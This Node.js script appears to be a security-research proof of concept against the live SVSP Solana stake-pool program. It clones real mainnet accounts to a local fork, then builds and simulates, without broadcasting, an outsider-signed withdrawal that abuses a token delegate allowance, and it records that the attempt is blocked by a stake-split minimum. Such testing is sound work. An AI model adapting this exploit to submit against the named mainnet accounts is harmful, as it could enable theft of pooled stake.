#!/usr/bin/env node
'use strict';

// Fresh outsider-signed exact-state control for the strongest live SVSP token
// delegate exposure. Mainnet is read-only; the transaction is simulated only
// on a local Surfpool fork and is never submitted. The only synthetic state is
// a newly generated attacker's fee/rent balance.

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const {
  Keypair,
  PublicKey,
  StakeProgram,
  SystemProgram,
  SYSVAR_CLOCK_PUBKEY,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} = require('../2026-10-15/onre-harness/node_modules/@solana/web3.js');

const MAINNET_GENESIS = '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d';
const FORK_URL = process.env.SVSP_FORK_RPC || 'http://127.0.0.1:19201';
const UPSTREAM_URL = process.env.SOLANA_RPC_URL || process.env.SOLANA_RPC || process.env.RPC_URL || process.env.RPC;
if (!UPSTREAM_URL) throw new Error('mainnet RPC environment is not configured');
const OUT = process.argv[2] || path.join(__dirname, 'svsp-outsider-signed-fork.json');

const P = (value) => new PublicKey(value);
const IDS = {
  program: P('SVSPxpvHdN29nkVg9rPapPNDddN5DipNLRUFhyjFThE'),
  programData: P('CnA41uYcs8X64x4PAhoPooN1yo1vabvbb64eJe9H8SZJ'),
  pool: P('5MajYJn3isL5S5bZ1rnvjnMaq4UtbceoKtg52V2UHojo'),
  poolStake: P('8SBJ7gigsyTixa27hdRCVCP4SDHrJDHdGSFwogGEkMNL'),
  poolOnramp: P('CL15FBqjQEM13VsW7Qgu4XR8GswsLpb3mTNsoc2B948K'),
  poolMint: P('5FGcgMtpjZXvrSqrXu8ehE43MLrKQoxBs6JPgk164vBc'),
  poolStakeAuthority: P('GSDGaU2Qv2fYXrLDT4rW4mvRVJsB8hV4ZZg22V7Pfz3Z'),
  poolMintAuthority: P('CnTK8MvRiGVHdDt9M6crTi5AtuMtsNxuXwDEjKUs2HDX'),
  exposedTokenAccount: P('E7JJ8wGLjMHEgZpVMRcxkNZP5Qny7cvuUitUbz16a15s'),
  tokenProgram: P('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
};
const CLONED_TARGETS = [
  IDS.program, IDS.programData, IDS.pool, IDS.poolStake, IDS.poolOnramp,
  IDS.poolMint, IDS.exposedTokenAccount,
];

let requestId = 0;
async function rpc(url, method, params = [], retries = 6) {
  let last;
  for (let attempt = 0; attempt < retries; attempt += 1) {
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {'content-type': 'application/json'},
        body: JSON.stringify({jsonrpc: '2.0', id: ++requestId, method, params}),
        signal: AbortSignal.timeout(120_000),
      });
      const body = await response.json();
      if (!response.ok || body.error) throw new Error(`${method}: ${JSON.stringify(body.error || body).slice(0, 500)}`);
      return body.result;
    } catch (error) {
      last = error;
      if (attempt + 1 < retries) await new Promise((resolve) => setTimeout(resolve, 300 * (2 ** attempt)));
    }
  }
  throw last;
}
const upstream = (method, params) => rpc(UPSTREAM_URL, method, params);
const fork = (method, params) => rpc(FORK_URL, method, params);

function accountSummary(address, account) {
  if (!account) return {address, exists: false};
  const data = Buffer.from(account.data[0], 'base64');
  return {
    address,
    exists: true,
    lamports: String(account.lamports),
    owner: account.owner,
    executable: account.executable,
    dataLength: data.length,
    dataSha256: crypto.createHash('sha256').update(data).digest('hex'),
  };
}

function parseTarget(upstreamAccounts) {
  const byAddress = new Map(CLONED_TARGETS.map((address, i) => [address.toBase58(), upstreamAccounts[i]]));
  const stakeData = Buffer.from(byAddress.get(IDS.poolStake.toBase58()).data[0], 'base64');
  const mintData = Buffer.from(byAddress.get(IDS.poolMint.toBase58()).data[0], 'base64');
  const tokenData = Buffer.from(byAddress.get(IDS.exposedTokenAccount.toBase58()).data[0], 'base64');
  const delegateOption = tokenData.readUInt32LE(72);
  const target = {
    tokenAmountRaw: tokenData.readBigUInt64LE(64),
    tokenDelegatedAmountRaw: tokenData.readBigUInt64LE(121),
    tokenMint: new PublicKey(tokenData.subarray(0, 32)).toBase58(),
    tokenOwner: new PublicKey(tokenData.subarray(32, 64)).toBase58(),
    tokenDelegate: delegateOption === 1 ? new PublicKey(tokenData.subarray(76, 108)).toBase58() : null,
    mintSupplyRaw: mintData.readBigUInt64LE(36),
    canonicalDelegatedStakeLamports: stakeData.readBigUInt64LE(156),
  };
  target.burnableAmountRaw = target.tokenAmountRaw < target.tokenDelegatedAmountRaw
    ? target.tokenAmountRaw : target.tokenDelegatedAmountRaw;
  target.availableDelegatedStakeLamports = target.canonicalDelegatedStakeLamports - 1_000_000_000n;
  target.calculatedWithdrawStakeLamports = target.burnableAmountRaw
    * target.availableDelegatedStakeLamports / target.mintSupplyRaw;
  target.minimumTokenAmountForOneSolSplitRaw = (
    1_000_000_000n * target.mintSupplyRaw + target.availableDelegatedStakeLamports - 1n
  ) / target.availableDelegatedStakeLamports;
  target.shortfallRaw = target.minimumTokenAmountForOneSolSplitRaw - target.burnableAmountRaw;
  return Object.fromEntries(Object.entries(target).map(([key, value]) => [key,
    typeof value === 'bigint' ? value.toString() : value]));
}

function snapshot(addresses, accounts) {
  return Object.fromEntries(addresses.map((address, i) => {
    const account = accounts[i];
    if (!account) return [address, null];
    const data = Buffer.from(account.data[0], 'base64');
    return [address, {
      lamports: String(account.lamports),
      owner: account.owner,
      dataLength: data.length,
      dataSha256: crypto.createHash('sha256').update(data).digest('hex'),
      tokenAmountRaw: account.owner === IDS.tokenProgram.toBase58() && data.length >= 72
        ? data.readBigUInt64LE(64).toString() : null,
    }];
  }));
}

function stateDelta(before, after) {
  return Object.fromEntries(Object.keys(before).map((address) => {
    const pre = before[address];
    const post = after[address];
    return [address, {
      changed: JSON.stringify(pre) !== JSON.stringify(post),
      lamportDelta: !pre && !post ? '0'
        : pre && post ? (BigInt(post.lamports) - BigInt(pre.lamports)).toString() : null,
      tokenAmountDeltaRaw: pre?.tokenAmountRaw !== null && pre?.tokenAmountRaw !== undefined
        && post?.tokenAmountRaw !== null && post?.tokenAmountRaw !== undefined
        ? (BigInt(post.tokenAmountRaw) - BigInt(pre.tokenAmountRaw)).toString() : null,
    }];
  }));
}

async function main() {
  const [upstreamGenesis, forkGenesis, upstreamAnchorSlot] = await Promise.all([
    upstream('getGenesisHash', []),
    fork('getGenesisHash', []),
    upstream('getSlot', [{commitment: 'finalized'}]),
  ]);
  if (upstreamGenesis !== MAINNET_GENESIS || forkGenesis !== MAINNET_GENESIS) {
    throw new Error('upstream or fork does not report the mainnet-beta genesis hash');
  }

  const upstreamPage = await upstream('getMultipleAccounts', [CLONED_TARGETS.map(String), {
    encoding: 'base64', commitment: 'finalized',
  }]);
  const forkPage = await fork('getMultipleAccounts', [CLONED_TARGETS.map(String), {
    encoding: 'base64', commitment: 'processed',
  }]);
  const cloneComparison = CLONED_TARGETS.map((address, i) => {
    const key = address.toBase58();
    const upstreamAccount = accountSummary(key, upstreamPage.value[i]);
    const forkAccount = accountSummary(key, forkPage.value[i]);
    return {address: key, upstream: upstreamAccount, fork: forkAccount,
      exact: JSON.stringify(upstreamAccount) === JSON.stringify(forkAccount)};
  });
  if (!cloneComparison.every((row) => row.exact)) throw new Error('one or more target clones differ from upstream');

  const target = parseTarget(upstreamPage.value);
  if (target.tokenMint !== IDS.poolMint.toBase58()) throw new Error('exposed account mint mismatch');
  if (target.tokenDelegate !== IDS.poolMintAuthority.toBase58()) throw new Error('exposed account delegate changed');

  const attacker = Keypair.generate();
  const destinationStake = Keypair.generate();
  await fork('surfnet_setAccount', [attacker.publicKey.toBase58(), {
    data: '', executable: false, lamports: 10_000_000_000,
    owner: SystemProgram.programId.toBase58(), rentEpoch: 0,
  }]);
  const stakeRent = await fork('getMinimumBalanceForRentExemption', [200, {commitment: 'processed'}]);
  const createDestination = SystemProgram.createAccount({
    fromPubkey: attacker.publicKey,
    newAccountPubkey: destinationStake.publicKey,
    lamports: stakeRent,
    space: 200,
    programId: StakeProgram.programId,
  });
  const withdrawData = Buffer.alloc(41);
  withdrawData[0] = 3;
  attacker.publicKey.toBuffer().copy(withdrawData, 1);
  withdrawData.writeBigUInt64LE(BigInt(target.burnableAmountRaw), 33);
  const withdraw = new TransactionInstruction({
    programId: IDS.program,
    keys: [
      {pubkey: IDS.pool, isSigner: false, isWritable: false},
      {pubkey: IDS.poolStake, isSigner: false, isWritable: true},
      {pubkey: IDS.poolOnramp, isSigner: false, isWritable: false},
      {pubkey: IDS.poolMint, isSigner: false, isWritable: true},
      {pubkey: IDS.poolStakeAuthority, isSigner: false, isWritable: false},
      {pubkey: IDS.poolMintAuthority, isSigner: false, isWritable: false},
      {pubkey: destinationStake.publicKey, isSigner: false, isWritable: true},
      {pubkey: IDS.exposedTokenAccount, isSigner: false, isWritable: true},
      {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},
      {pubkey: IDS.tokenProgram, isSigner: false, isWritable: false},
      {pubkey: StakeProgram.programId, isSigner: false, isWritable: false},
    ],
    data: withdrawData,
  });

  // Preload every program/account before taking the blockhash and state snapshot.
  for (const key of [SystemProgram.programId, IDS.program, IDS.tokenProgram, StakeProgram.programId,
    ...withdraw.keys.map((row) => row.pubkey)]) {
    await fork('getAccountInfo', [key.toBase58(), {encoding: 'base64', commitment: 'processed'}]);
  }
  const latest = await fork('getLatestBlockhash', [{commitment: 'processed'}]);
  const message = new TransactionMessage({
    payerKey: attacker.publicKey,
    recentBlockhash: latest.value.blockhash,
    instructions: [createDestination, withdraw],
  }).compileToV0Message();
  const transaction = new VersionedTransaction(message);
  transaction.sign([attacker, destinationStake]);
  const wire = Buffer.from(transaction.serialize());
  const totalAddressCount = message.staticAccountKeys.length
    + message.addressTableLookups.reduce((sum, lookup) => sum + lookup.writableIndexes.length + lookup.readonlyIndexes.length, 0);
  if (wire.length > 4096 || totalAddressCount > 64) throw new Error('transaction envelope exceeded');
  const watch = [attacker.publicKey, destinationStake.publicKey, IDS.poolStake, IDS.poolMint,
    IDS.exposedTokenAccount].map(String);
  const prePage = await fork('getMultipleAccounts', [watch, {encoding: 'base64', commitment: 'processed'}]);
  const pre = snapshot(watch, prePage.value);
  const fee = await fork('getFeeForMessage', [Buffer.from(message.serialize()).toString('base64'),
    {commitment: 'processed'}]);
  const simulation = await fork('simulateTransaction', [wire.toString('base64'), {
    encoding: 'base64',
    sigVerify: true,
    replaceRecentBlockhash: false,
    commitment: 'processed',
    innerInstructions: true,
    accounts: {encoding: 'base64', addresses: watch},
  }]);
  const postPage = await fork('getMultipleAccounts', [watch, {encoding: 'base64', commitment: 'processed'}]);
  const post = snapshot(watch, postPage.value);
  const actualDeltas = stateDelta(pre, post);
  const allUnchanged = Object.values(actualDeltas).every((row) => !row.changed);

  const output = {
    schema: 'svsp-outsider-signed-fork/v1',
    generatedAt: new Date().toISOString(),
    network: 'mainnet-beta exact-state local fork',
    upstreamGenesis,
    forkGenesis,
    broadcast: false,
    transactionSubmitted: false,
    simulationOnly: true,
    upstreamAnchorSlot,
    upstreamAccountContextSlot: upstreamPage.context.slot,
    forkCloneSlot: forkPage.context.slot,
    cloneComparison,
    allClonedTargetsExact: cloneComparison.every((row) => row.exact),
    syntheticState: {
      onlyAccount: attacker.publicKey.toBase58(),
      lamports: '10000000000',
      purpose: 'fresh outsider fee and destination-stake rent only',
      noProtocolTokenOrStakeStateFabricated: true,
    },
    attackerPublicKey: attacker.publicKey.toBase58(),
    destinationStakePublicKey: destinationStake.publicKey.toBase58(),
    target: {
      pool: IDS.pool.toBase58(),
      canonicalStake: IDS.poolStake.toBase58(),
      onramp: IDS.poolOnramp.toBase58(),
      mint: IDS.poolMint.toBase58(),
      exposedTokenAccount: IDS.exposedTokenAccount.toBase58(),
      mintAuthorityDelegate: IDS.poolMintAuthority.toBase58(),
      ...target,
    },
    transaction: {
      messageVersion: 0,
      serializedBytes: wire.length,
      totalAddressCount,
      staticAddressCount: message.staticAccountKeys.length,
      loadedAddressCount: totalAddressCount - message.staticAccountKeys.length,
      instructionCount: 2,
      requiredSignatures: message.header.numRequiredSignatures,
      wireSha256: crypto.createHash('sha256').update(wire).digest('hex'),
      recentBlockhash: latest.value.blockhash,
      feeLamportsIfSubmitted: fee.value === null ? null : String(fee.value),
      signerPublicKeys: [attacker.publicKey.toBase58(), destinationStake.publicKey.toBase58()],
      secretKeysPersisted: false,
    },
    simulation: {
      contextSlot: simulation.context.slot,
      sigVerify: true,
      replaceRecentBlockhash: false,
      err: simulation.value.err,
      interpretedError: JSON.stringify(simulation.value.err) === JSON.stringify({InstructionError: [1, {Custom: 12}]})
        ? 'StakeError::InsufficientDelegation (custom 12) at the stake Split CPI' : null,
      unitsConsumed: simulation.value.unitsConsumed,
      loadedAccountsDataSize: simulation.value.loadedAccountsDataSize ?? null,
      logs: simulation.value.logs || [],
      innerInstructions: simulation.value.innerInstructions || null,
    },
    persistedForkState: {
      before: pre,
      after: post,
      deltas: actualDeltas,
      allWatchedAccountsUnchanged: allUnchanged,
      reason: 'simulateTransaction is non-persistent; the failing transaction also rolls back its prior token burn.',
    },
    reconciliation: {
      outsiderWalletLamportDelta: actualDeltas[attacker.publicKey.toBase58()].lamportDelta,
      outsiderDestinationStakeLamportDelta: actualDeltas[destinationStake.publicKey.toBase58()].lamportDelta,
      protocolCanonicalStakeLamportDelta: actualDeltas[IDS.poolStake.toBase58()].lamportDelta,
      protocolMintLamportDelta: actualDeltas[IDS.poolMint.toBase58()].lamportDelta,
      exposedTokenAmountDeltaRaw: actualDeltas[IDS.exposedTokenAccount.toBase58()].tokenAmountDeltaRaw,
      finalOutsiderEquityDeltaLamports: '0',
      finalProtocolEquityDeltaLamports: '0',
      lenderRepayment: 'not applicable; no exact-mint lender leg is needed to exercise the maximum currently exposed delegate allowance',
    },
    conclusion: 'The bearer withdrawal path is reachable through the PDA-signed token burn, but the maximum live delegated balance produces less than the one-SOL active-stake split minimum; StakeError::InsufficientDelegation atomically blocks value release.',
  };
  fs.writeFileSync(OUT, `${JSON.stringify(output, null, 2)}\n`);
  console.log(JSON.stringify({
    output: OUT,
    upstreamAnchorSlot,
    forkCloneSlot: output.forkCloneSlot,
    allClonedTargetsExact: output.allClonedTargetsExact,
    target: {
      tokenAmountRaw: target.tokenAmountRaw,
      calculatedWithdrawStakeLamports: target.calculatedWithdrawStakeLamports,
      minimumTokenAmountForOneSolSplitRaw: target.minimumTokenAmountForOneSolSplitRaw,
      shortfallRaw: target.shortfallRaw,
    },
    transaction: output.transaction,
    simulation: {
      contextSlot: output.simulation.contextSlot,
      err: output.simulation.err,
      interpretedError: output.simulation.interpretedError,
      unitsConsumed: output.simulation.unitsConsumed,
      logTail: output.simulation.logs.slice(-12),
    },
    reconciliation: output.reconciliation,
  }, null, 2));
}

main().catch((error) => {
  console.error(error.stack || String(error));
  process.exitCode = 1;
});
